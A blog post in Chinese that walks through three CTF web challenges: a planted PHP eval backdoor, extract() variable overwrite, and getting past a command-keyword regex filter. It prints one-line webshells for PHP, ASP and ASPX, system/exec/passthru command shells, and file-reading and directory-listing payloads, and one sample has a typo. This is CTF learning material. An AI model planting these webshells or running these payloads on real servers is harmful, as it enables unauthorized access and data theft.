@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="web-writeup-1  basic rcehttp:&#x2F;&#x2F;www.henuctf.com:2077&#x2F;yijuhua&#x2F; 一.审题该题是考察一句话木马。查找资料后发现这题有点像【bugkuctf】过狗一句话，hack在目标服务器已经放置好了一句话木马，题中有个eval($_GET[&#39;a&#39;])函数，这标志着我们只需要利用好这个木马，读取flag文件。 二.学习笔记1.什么是一句话木马">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web-writeup-1">
+<meta property="og:url" content="http://example.com/2020/11/24/web-writeup/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="web-writeup-1  basic rcehttp:&#x2F;&#x2F;www.henuctf.com:2077&#x2F;yijuhua&#x2F; 一.审题该题是考察一句话木马。查找资料后发现这题有点像【bugkuctf】过狗一句话，hack在目标服务器已经放置好了一句话木马，题中有个eval($_GET[&#39;a&#39;])函数，这标志着我们只需要利用好这个木马，读取flag文件。 二.学习笔记1.什么是一句话木马">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2020/11/24/web-writeup/3.jpeg">
+<meta property="og:image" content="http://example.com/2020/11/24/web-writeup/1.png">
+<meta property="og:image" content="http://example.com/2020/11/24/web-writeup/2.png">
+<meta property="og:image" content="http://example.com/2020/11/24/web-writeup/3.png">
+<meta property="og:image" content="http://example.com/2020/11/24/web-writeup/4.jpg">
+<meta property="og:image" content="http://example.com/2020/11/24/web-writeup/5.jpeg">
+<meta property="article:published_time" content="2020-11-24T07:54:45.000Z">
+<meta property="article:modified_time" content="2021-03-02T06:34:07.799Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2020/11/24/web-writeup/3.jpeg">
+
+<link rel="canonical" href="http://example.com/2020/11/24/web-writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>web-writeup-1 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/24/web-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          web-writeup-1
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-11-24 15:54:45" itemprop="dateCreated datePublished" datetime="2020-11-24T15:54:45+08:00">2020-11-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-03-02 14:34:07" itemprop="dateModified" datetime="2021-03-02T14:34:07+08:00">2021-03-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/weblearning/" itemprop="url" rel="index"><span itemprop="name">weblearning</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="web-writeup-1"><a href="#web-writeup-1" class="headerlink" title="web-writeup-1"></a><strong>web-writeup</strong>-1</h1><img src="/2020/11/24/web-writeup/3.jpeg" alt="iceland" style="zoom: 50%;">
+
+<h2 id="basic-rce"><a href="#basic-rce" class="headerlink" title="basic rce"></a><strong>basic rce</strong></h2><p><a target="_blank" rel="noopener" href="http://www.henuctf.com:2077/yijuhua/">http://www.henuctf.com:2077/yijuhua/</a></p>
+<h3 id="一-审题"><a href="#一-审题" class="headerlink" title="一.审题"></a>一.审题</h3><p>该题是考察一句话木马。查找资料后发现这题有点像【bugkuctf】过狗一句话，hack在目标服务器已经放置好了一句话木马，题中有个<code>eval($_GET[&#39;a&#39;])函数</code>，这标志着我们只需要利用好这个木马，读取flag文件。</p>
+<h3 id="二-学习笔记"><a href="#二-学习笔记" class="headerlink" title="二.学习笔记"></a>二.学习笔记</h3><h4 id="1-什么是一句话木马"><a href="#1-什么是一句话木马" class="headerlink" title="1.什么是一句话木马"></a>1.什么是一句话木马</h4><ol>
+<li>文件上传是大部分web应用都具备的功能，如用户上传文件，头像等。</li>
+<li>正常上传的文件一般是图片文档视频等，web应用收集后放在后台，等待用户调用返回</li>
+<li>如果恶意文件如PHP、ASP等执行文件绕过web应用并顺利执行，则相当于hacker直接拿到webshell</li>
+<li>一旦hacker拿到了webshell，则可以拿到web应用的数据，删除web文件，本地提取，进一步拿下整个服务器甚至内网</li>
+<li>SQL注入的对象是数据库服务，而文件上传漏洞主要攻击web服务，两种渗透相结合以达到对目标深度控制</li>
+<li>常用的工具为中国菜刀和中国蚁剑</li>
+</ol>
+<h4 id="2-入侵条件"><a href="#2-入侵条件" class="headerlink" title="2.入侵条件"></a>2.入侵条件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）木马上传成功，未被杀；</span><br><span class="line">（2）知道木马的路径在哪；</span><br><span class="line">（3）上传的木马能正常运行。</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-漏洞成因"><a href="#3-漏洞成因" class="headerlink" title="3.漏洞成因"></a>3.漏洞成因</h4><p>文件上传漏洞的成因，一方面服务器配置不当会导致任意文件上传；另一方面，Web 应用开放了文件上传功能，并且对上传的文件没有进行足够的限制；再者就是程序开发部署时候，没有考虑到系统特性和验证过滤不严格而导致限制被绕过，上传任意文件。</p>
+<h4 id="4-webshell"><a href="#4-webshell" class="headerlink" title="4.webshell"></a>4.webshell</h4><h5 id="a-定义"><a href="#a-定义" class="headerlink" title="a.定义"></a>a.定义</h5><p>在计算机科学中，Shell 俗称壳（用来区别“核”），是指“为使用者提供操作界面”的软件（命令解释器）。类似于windows 系统给的cmd.exe 或者Linux 下bash 等，虽然这些系统的命令解释器不止一种。</p>
+<p>webshell是以asp、php、jsp等网页文件形式存在的一种命令执行环境，也称其为一种网页后门。一般说来，当Hacker入侵一个网站后，会把这些asp、php木马的后门文件放在该网站的web目录中，和正常的网页文件混杂，其命名可能和正常的文件命名很类似，让人无法第一眼通过文件名判断其为后门文件。然后呢，他就可以利用web请求的方式，用asp或者php木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等一系列操作。</p>
+<h5 id="b-分类"><a href="#b-分类" class="headerlink" title="b.分类"></a>b.分类</h5><ol>
+<li><p><strong>大马</strong>    就是网站木马。有一类WebShell 之所以叫大马，是因为与小马（一句话木马）区分开，并且代码量较大，但是功能丰富。同样，大马又很多脚本格式，其功能基本相同。每个团队都有自己的定制木马。</p>
+<p>在大马中，我们可以进行文件管理，执行系统命令等，还有一些其他定制功能。</p>
+</li>
+<li><p><strong>小马</strong>    小马就是一句话木马，因为其代码量比较小，就是一句简单的代码，<u><em>短小精悍</em></u>。常见的小马：</p>
+<ul>
+<li><p>php的一句话木马： <code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code> </p>
+</li>
+<li><p>asp的一句话是：   <code>&lt;%eval request (&quot;pass&quot;)%&gt;</code> </p>
+</li>
+<li><p>aspx的一句话是：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>而本题涉及的是php小马，所以搜寻了一些php小马方式：</p>
+<p>1.<strong>system()</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">system($cmd);</span><br><span class="line">?&gt;    &#x2F;&#x2F;调用system来执行命令</span><br></pre></td></tr></table></figure>
+
+<p>2.<strong>exec()</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">echo exec($cmd);</span><br><span class="line">?&gt;   &#x2F;&#x2F;调用exec执行命令</span><br></pre></td></tr></table></figure>
+
+<p>3.<strong>passthru()</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line"> passthru($cmd);</span><br><span class="line"> ?&gt;      &#x2F;&#x2F;调用passthru执行命令</span><br></pre></td></tr></table></figure>
+
+<p>4.<strong>echo <code>$cmd</code></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd &#x3D; $_GET[‘cmd’] ;</span><br><span class="line">echo &#96;$cmd&#96;;</span><br><span class="line">?&gt;  &#x2F;&#x2F;调用echo执行命令</span><br></pre></td></tr></table></figure>
+
+<p>5.<strong>eval()</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd &#x3D; &#x3D;_GET[‘cmd’] ;</span><br><span class="line">eval($cmd)</span><br><span class="line">?&gt;   &#x2F;&#x2F;通过eval执行命令</span><br></pre></td></tr></table></figure></li>
+</ol>
+<hr>
+<h4 id="本题分析"><a href="#本题分析" class="headerlink" title="本题分析"></a><strong>本题分析</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//拿到flag就不要乱玩了哦~ </span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>拿本题来看，这是属于第5种类型。<code>$_GET[&#39;a&#39;]</code>是指目标服务器中小马的密码为<code>a</code> ；<code>show_source(__FILE__);</code>指当使用该函数时，整个文件都将被显示；<code>eval()</code>则是把字符串作为PHP代码执行,例如：<code>eval(&quot;echo &#39;a&#39;&quot;)</code>;其实就等于直接 <code>echo &#39;a&#39;</code>;再来看看<code>&lt;?php eval($_GET[&#39;a&#39;]); ?&gt;</code>首先，用get方式接收变量a，比如接收到了：a=echo ‘a’;这时代码就变成<code>&lt;?php eval(&quot;echo &#39;a&#39;;&quot;); ?&gt;</code>。也就是说，你想执行什么代码，就把什么代码放进变量a里，用GET传输给一句话木马，你想查看目标硬盘里的文件，可以用php函数：<code>opendir()</code>和<code>readdir()</code>等等。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;print_r(readfile(&#39;路径&#39;));读取文件</span><br><span class="line">?a&#x3D;print_r(fopen(&#39;路径&#39;));读取文件</span><br><span class="line">?a&#x3D;print_r(glob(&#39;*.php&#39;));读取文件</span><br><span class="line">?a&#x3D;print_r(scandir(current(localeconv())));扫描目录</span><br><span class="line">?a&#x3D;print_r(scandir(pos(localeconv())));扫描目录</span><br></pre></td></tr></table></figure>
+
+<p>这题我用<code>?a=print_r(glob(&#39;*.php&#39;));</code>抓取了文件所有文件名包含php的文件（.txt没有读取到），读取到了一个像flag的php文件<img src="/2020/11/24/web-writeup/1.png"></p>
+<p>尝试直接访问文件，无法成功，这里使用system函数读取php文件但是要base64转码，payload：<code>?a=system(&quot;cat f111a9.php | base64&quot;);</code>    或者直接 <strong>php无参数函数构造</strong>， 也就是需要无参数完成 RCE ,<code>a=print_r(readfile(next(array_reverse(scandir(pos(localeconv()))))));</code>     *pos(localeconv())等于.*在元素查看器可看到flag<img src="/2020/11/24/web-writeup/2.png"></p>
+<p>亦或者<code>a=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code>也有类似的作用不过这是直接在页面中显示<img src="/2020/11/24/web-writeup/3.png"></p>
+<p>还可以用system函数Is一下，看看目录：<code>system(&quot;ls&quot;);</code></p>
+<p>然后继续用system函数查看flag文件，<code>system(&quot;cat 文件名&quot;)</code></p>
+<hr>
+<h2 id="php变量覆盖"><a href="#php变量覆盖" class="headerlink" title="php变量覆盖"></a>php变量覆盖</h2><p><a target="_blank" rel="noopener" href="http://a16ne.cn:1002/">http://a16ne.cn:1002/</a></p>
+<h3 id="一-审题，做题分析"><a href="#一-审题，做题分析" class="headerlink" title="一.审题，做题分析"></a>一.审题，做题分析</h3><p>由题目可知这是php的变量覆盖，百度后知道变量覆盖漏洞指的是可以用我们的传参值替换原有的变量值。百度后可以大致分析出代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;xxxxxxxx&#x27;</span>; <span class="comment">//给变量flag赋一个值</span></span><br><span class="line">extract(<span class="variable">$_GET</span>); <span class="comment">//extract函数（变量覆盖的标志），并用get传参</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$liwu</span>)) &#123;  <span class="comment">//判断是否声明了变量 liwu      </span></span><br><span class="line">    <span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>));   <span class="comment">//file_get_contents函数指打开输出这个文件的内容，而打开的文件名即为赋给flag的值；   trim函数是移除字符串两侧的空白字符或其他预定义字符。功能除去字符串开头和末尾的空格或其他字符。如：&quot; abc &quot;会变成&quot;abc&quot;(无关紧要)； $content=，也是赋值 </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$liwu</span>==<span class="variable">$content</span>) &#123; <span class="comment">//判断两个变量是否绝对相等</span></span><br><span class="line">        <span class="keyword">echo</span><span class="string">&#x27;flag&#123;xxxxxxxxxxx&#125;&#x27;</span>; <span class="comment">//相等则输出flag</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&#x27;please try other operation.&#x27;</span>; <span class="comment">//错误则输出。。。</span></span><br><span class="line">         &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以解这题的关键就是使两个变量相等，而flag是已经确定的变量但是我们不知道，不过extract函数的作用就是可以把flag的值给覆盖掉。其中最普遍的方法就是给<code>flag</code>赋一个空值，而文件显示也会变空值，最后<code>content</code>变量也就为空，接着给<code>liwu</code>也赋个空值就相等了。payload：<code>?flag=&amp;liwu=</code>  ; 想了下也可直接，?<code>content=&amp;liwu=</code> ；还可以给flag随便赋一个值，只要是目标服务器中没有的文件名就可，如 <code>?flag=123&amp;liwu=</code></p>
+<h3 id="二-学习笔记-1"><a href="#二-学习笔记-1" class="headerlink" title="二.学习笔记"></a>二.学习笔记</h3><h4 id="1-extract-变量覆盖"><a href="#1-extract-变量覆盖" class="headerlink" title="1.extract()变量覆盖"></a>1.extract()变量覆盖</h4><p>extract()函数能将变量从数组导入当前的符号表，定义：extract(array,extract_rules,prefix)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array 必需。规定要使用的数组</span><br><span class="line">extract_rules 可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定</span><br><span class="line">前缀和数组键名之间会自动加上一个下划线</span><br></pre></td></tr></table></figure>
+
+<p>该函数的作用：使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。做了一道题，如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123; <span class="meta">?&gt;</span> <span class="comment">//判断传参方式为post</span></span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">            extract(<span class="variable">$_POST</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$pass</span> == <span class="variable">$thepassword_123</span>) &#123; <span class="meta">?&gt;</span> <span class="comment">//判断输入的pass和已有的thepassword（未知）两个变量是否相等</span></span><br><span class="line">              &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">                &lt;code&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$theflag</span>; <span class="meta">?&gt;</span>       <span class="comment">//相等就输出flag   &lt;/code&gt;</span></span><br><span class="line">              &lt;/div&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line">          <span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>虽然我们不知道<code>thepassword_123</code>的值，但是extract函数可以覆盖它，所以payload：pass=a&amp;password_123=a</p>
+<h4 id="2-其他"><a href="#2-其他" class="headerlink" title="2.其他"></a>2.其他</h4><p>类似的还有<strong>parse_str()变量覆盖</strong>     <strong>import_request_variables()变量覆盖</strong>   <strong>$$使用不当</strong>                                                        </p>
+<p>*<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35569814/article/details/100588340">参考资料</a>*（很全，就不复制张贴了）</p>
+<h2 id><a href="#" class="headerlink" title></a></h2><hr>
+<h2 id="basic-rce2"><a href="#basic-rce2" class="headerlink" title="basic rce2"></a>basic rce2</h2><h3 id="一-审题-1"><a href="#一-审题-1" class="headerlink" title="一.审题"></a>一.审题</h3><p>这题考察web的<strong>命令执行</strong>要绕过正则表达式的过滤作用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//flag in flag //提示flag在flag文件中</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Rem&#x27;</span>]))&#123; <span class="comment">//判断是否get传参Rem参数</span></span><br><span class="line">  <span class="variable">$Ram</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;Rem&#x27;</span>]; <span class="comment">//定义Ram参数的值即为传的参数</span></span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/(more|less|flag|head|nl|tail|tac|cat|rm|cp|mv|\*|\&#123;)/i&quot;</span>, <span class="variable">$Ram</span>))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;strong&gt;&lt;center&gt;总之就是非常可爱&lt;/center&gt;&lt;/strong&gt;&quot;</span>); <span class="comment">//正则表达式绕过，只要传的参数中有过滤的字符就输出</span></span><br><span class="line">  &#125; </span><br><span class="line">  <span class="variable">$a</span> = <span class="keyword">eval</span>(<span class="variable">$Ram</span>); <span class="comment">//又是eval函数，可将$Ram的值变成指令，所以想办法get一个查看flag的指令，但是又要绕过正则表达式的过滤</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;爬爬爬我最会爬了&#x27;)//</span></span><br><span class="line"><span class="string">  &lt;/script&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>这题还可以用无参数函数构造，*<a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">也就是需要无参数完成 RCE</a>*，payload：</p>
+<p><code>Rem=print_r(readfile(next(array_reverse(scandir(pos(localeconv()))))));</code>不用过滤直接出，好家伙。</p>
+<p><img src="/2020/11/24/web-writeup/4.jpg"></p>
+<p>首先可以用system函数Is一下查看目录，再接着绕过正则表达式，具体的方法有很多，比如base64,进制转换，反斜杆，等</p>
+<p><em><strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40671478/article/details/107569287?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160681018819724813266872%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160681018819724813266872&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-107569287.first_rank_v2_pc_rank_v29&utm_term=%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87&spm=1018.2118.3001.4449">参考资料</a></strong></em></p>
+<h3 id="2-学习笔记"><a href="#2-学习笔记" class="headerlink" title="2.学习笔记"></a>2.学习笔记</h3><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><ul>
+<li>正则表达式是一种可以用于模式匹配和替换的强大工具。</li>
+<li>一个正则表达式，分为三个部分：分隔符，表达式和修饰符。</li>
+<li>分隔符可以是除了特殊字符以外的任何字符（比如”/ !”等等），常用的分隔符是”/”。</li>
+<li>表达式由一些特殊字符（特殊字符详见下面）和非特殊的字符串组成，比如”[a-z0-9_-]+@[a-z0-9_-.]+”可以匹配一个简单的电子邮件字符串。</li>
+<li>修饰符是用来开启或者关闭某种功能/模式。</li>
+<li>匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个） ls file *<br>? 匹配任何一个字符（不在括号内时）?代表任意1个字符 ls file 0<br>[abcd] 匹配abcd中任何一个字符<br>[a-z] 表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0</li>
+</ul>
+<p>如：/hello.+?hello/is </p>
+<p>上面的正则表达式”/”就是分隔符，两个”/”之间的就是表达式，第二个”/”后面的字符串”is”就是修饰符。<br>  在表达式中如果含有分隔符，那么就需要使用转义符号”/”，比如”/hello.+?//hello/is”。转义符号除了用于分隔符外还可以执行特殊字符，全部由字母构成的特殊字符都需要”/”来转义，比如”/d”代表全体数字。***<a target="_blank" rel="noopener" href="https://blog.csdn.net/William0318/article/details/54345526?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160656869119724827695135%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160656869119724827695135&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-54345526.first_rank_v2_pc_rank_v29&utm_term=php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1018.2118.3001.4449">资料参考</a>***</p>
+<h4 id="主要的过滤内容"><a href="#主要的过滤内容" class="headerlink" title="主要的过滤内容"></a>主要的过滤内容</h4><p>1.<strong>假如cat被过滤</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容 </span><br><span class="line">less:与 more 类似 </span><br><span class="line">head:查看头几行 </span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示 tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号 </span><br><span class="line">od:以二进制的方式读取档案内容 </span><br><span class="line">vi:一种编辑器，这个也可以查看 </span><br><span class="line">vim:一种编辑器，这个也可以查看 </span><br><span class="line">sort:可以查看 </span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br></pre></td></tr></table></figure>
+
+<p>2.<strong>过滤命令执行函数</strong>，其中system和passthru是有回显的，其他的就得需要我们自行输出。</p>
